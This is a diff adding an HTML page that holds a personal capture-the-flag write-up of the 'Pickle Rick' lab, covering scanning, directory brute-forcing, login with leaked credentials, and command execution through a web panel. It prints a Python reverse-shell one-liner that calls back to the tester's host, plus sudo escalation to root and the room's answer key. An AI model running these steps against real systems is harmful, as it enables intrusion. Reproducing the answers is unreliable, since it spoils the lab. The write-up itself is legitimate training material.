@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Imumesh - Hydra</title>
+    <link rel="icon" type="img/x-icon" href="../resources/favicon/favicon.png">
+    <link rel="stylesheet" href="../css/all.css">
+</head>
+
+<body>
+    <div class="wrapper-normal">
+        <div class="page about">
+            <nav class="nav-home">
+                <ul class="list">
+                    <li class="item">
+                        <a class="link" href="../index" rel="canonical">Home</a>
+                    </li>
+                    <li class="item">
+                        <a class="link" href="../books" rel="canonical">Books</a>
+                    </li>
+                    <li class="item">
+                        <a class="link" href="../projects" rel="canonical">Projects</a>
+                    </li>
+                    <li class="item">
+                        <a class="link" href="../blog" rel="canonical">Blog</a>
+                    </li>
+                    <li class="item">
+                        <a class="link" href="../contact" rel="canonical">Contact</a>
+                    </li>
+                </ul>
+            </nav>
+
+
+
+            <footer class="footer-main" style="padding: 5px 0;"></footer>
+            <center>
+                <h1 class="size-50" style="color: aliceblue;">Pickle Rick</h1>
+            </center>
+            <p style="text-align: justify;"><img src="/resources/images/home.png" alt="" /></p>
+            <p class="has-line-data" data-line-start="0" data-line-end="1">A Rick and Morty CTF. Help turn Rick back
+                into a human!</p>
+            <p class="has-line-data" data-line-start="2" data-line-end="3">This Rick and Morty themed challenge require
+                you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform
+                himself back into a human from a pickle.</p>
+            <p class="has-line-data" data-line-start="4" data-line-end="5" style="color: cornflowerblue;">Nmap Result:</p>
+            <pre><code>nmap -sC -sV -oA nmap/PickleRick 10.10.119.36
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-08 06:13 GMT
+Nmap scan report for 10.10.119.36
+Host is up (0.22s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 6d:38:ca:c9:2b:7d:d5:83:96:c4:0c:50:f4:e2:75:57 (RSA)
+|   256 2a:b8:62:c7:4a:63:4d:24:a7:00:06:ea:ef:a2:a7:29 (ECDSA)
+|_  256 ec:b7:3b:c5:5b:ee:78:af:0c:6d:87:68:82:50:f6:64 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Rick is sup4r cool
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+            <p class="has-line-data" data-line-start="22" data-line-end="23">Got this username on the webpage that
+                running on port 80.</p>
+            <pre><code>Note to self, remember username!
+Username: R1ckRul3s
+</code></pre>
+            <p class="has-line-data" data-line-start="27" data-line-end="28">Morty is asking for help to find the
+                Password. So there must be a login page. Let’s brute force the directory with dirbuster/dirb or
+                dirsearch.py.</p>
+            <p class="has-line-data" data-line-start="29" data-line-end="31">I used dirsearch.py for directory
+                bruteforce and the results I got:<br>
+                <pre><code>sudo python3 /opt/dirsearch/dirsearch.py -e * -u http://10.10.119.36/ --exclude-status 403,401</code></pre>
+                ></p>
+            <blockquote>
+                <p class="has-line-data" data-line-start="31" data-line-end="44">[sudo] password for superhuman:<br>
+                    <em>|. _ _ _ _ _ <em>|</em> v0.4.1<br>
+                        (</em>||| <em>) (/</em>(<em>|| (</em>| )<br>
+                    Extensions: nmap | HTTP method: GET | Threads: 30 | Wordlist size: 8932<br>
+                    Error Log: /opt/dirsearch/logs/errors-21-01-08_06-35-06.log<br>
+                    Target: http://10.10.119.36/<br>
+                    Output File: /opt/dirsearch/reports/10.10.119.36/_21-01-08_06-35-07.txt<br>
+                    [06:35:07] Starting:<br>
+                    [06:35:56] 301 - 313B - /assets -&gt; http://10.10.119.36/assets/br>
+                    [06:35:56] 200 - 2KB - /assets/<br>
+                    [06:36:21] 200 - 1KB - /index.html<br>
+                    [06:36:26] 200 - 882B - /login.php<br>
+                    [06:36:45] 200 - 17B - /robots.txt</p>
+            </blockquote>
+            <p style="text-align: justify;"><img src="/resources/images/robots.png" alt="" /></p>
+            <p class="has-line-data" data-line-start="45" data-line-end="47">First I checked for robots.txt, there I got
+                some weird text “Wubbalubbadubdub”. It could be a password for the username that we got recently. So I
+                tried this unpronounceable text as the password got the Username R1ckRul3s.</p>
+            <p style="text-align: justify;"><img src="/resources/images/login.png" alt="" /></p>
+
+            <p class="has-line-data" data-line-start="45" data-line-end="47">And Yes, I got into the dashboard “portal.php”.</p>
+            <p class="has-line-data" data-line-start="48" data-line-end="49">In the viewsource of portal.php got this
+                hash</p>
+
+            <pre><code>“Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==”</code></pre>
+            >
+            <p class="has-line-data" data-line-start="52" data-line-end="53">I tied to decode this base64 but it is
+                encoded with nested base64, so I tried to decrypt until I find the string. And finally found “rabbit
+                hole”. wasted my time here.</p>
+            <p class="has-line-data" data-line-start="54" data-line-end="55">Except for the commands Nav link, Other Nav
+                links were pointing to a page “denied.php”.Which says Only the REAL rick can view this page.</p>
+            <p style="text-align: justify;"><img src="/resources/images/commandPanel.png" alt="" /></p>
+            <p class="has-line-data" data-line-start="56" data-line-end="57">Now, we got a command execution webpage,
+                First I tried whoami command to check it’s actually working or not. but it got executed and gave output
+                as “www-data”. So
+                the command execution is possible, let’s try some more useful commands to extract more information. </p>
+            <p class="has-line-data" data-line-start="58" data-line-end="59">I used this python code to get a reverse
+                shell.</p>
+            <p style="text-align: justify;"><img src="/resources/images/commandPanel2.png" alt="" /></p>
+            <p style="text-align: justify;"><img src="/resources/images/reverseShell.png" alt="" /></p>
+            <p class="has-line-data" data-line-start="60" data-line-end="61">I tried “ls -al” command to check files
+                inside the “/var/www/html”. And we got our first ingredient.</p>
+            <pre><code>    total 40
+    drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
+    drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
+    -rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
+    drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
+    -rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
+    -rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
+    -rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
+    -rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
+    -rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
+    -rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
+</code></pre>
+            <p class="has-line-data" data-line-start="72" data-line-end="75">Tried to cat the
+                Sup3rS3cretPickl3Ingred.txt file, here the result that I got:<br>
+                “Command disabled to make it hard for future PICKLEEEE RICCCKKKK.”<br>
+                Only the user “ubuntu” can read these files. We have to find another way to get into the machine.</p>
+            <p class="has-line-data" data-line-start="76" data-line-end="82">I executed “ls -al /home”, result that I
+                got:<br>
+                total 16<br>
+                drwxr-xr-x 4 root root 4096 Feb 10 2019 .<br>
+                drwxr-xr-x 23 root root 4096 Jan 8 07:21 …<br>
+                drwxrwxrwx 2 root root 4096 Feb 10 2019 rick<br>
+                drwxr-xr-x 4 ubuntu ubuntu 4096 Feb 10 2019 ubuntu</p>
+            <p class="has-line-data" data-line-start="83" data-line-end="84">Here ubuntu is the user and rick is the
+                root user. So we have escalated to the ubuntu user first.</p>
+            <p class="has-line-data" data-line-start="85" data-line-end="87">In the command panel, I used python reverse
+                shell to get a reverse shell to Netcat.<br>
+                <pre><code>export RHOST=&quot;10.9.46.205&quot;;export RPORT=9999;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)'</code></pre>
+                ></p>
+            <p class="has-line-data" data-line-start="88" data-line-end="89">and started Netcat listener on port 9999,
+                and got a reverse shell. To stabilize the shell I used &quot;<strong style="color: bisque;">export
+                    TERM=xterm-256color</strong>&quot;</p>
+            <p class="has-line-data" data-line-start="90" data-line-end="93">To extract more information I uploaded
+                <b>LinEnum.sh</b> to the machine. And the result show:<br>
+                <pre><code>User www-data may run the following commands on ip-10-10-21-74.eu-west-1.compute.internal: (ALL) NOPASSWD: ALL</code></pre>
+                ></br>
+                <img src="/resources/images/sudoNOPASSWD.png" alt="" />
+            </p>    
+            <p class="has-line-data" data-line-start="94" data-line-end="95">So we can sudo into bash shell without a
+                password. and we got the root shell.</p>
+            <p style="text-align: justify;"><img src="/resources/images/root.png" alt="" /></p>
+
+            <pre><code>Challenge is to find the first ingredient for the transform.
+
+    (1)What is the first ingredient Rick needs?
+    The first ingredient is hidden in &quot;Sup3rS3cretPickl3Ingred.txt&quot; file.
+    Ans: mr. meeseek hair
+
+    (2) What the second ingredient Rick needs?
+    A second ingredient found in a file called &quot;second ingredients&quot; in the &quot;/home/rick&quot; directory.
+    Ans:1 jerry tear
+
+    (3) What is the final ingredient Rick needs?
+    Ans:fleeb juice</code></pre>
+
+
+            <footer class="footer-main">
+                © Umesh Chandra Bhuyan 2019
+            </footer>
+
+        </div>
+</body>
+
+</html>
+</div>
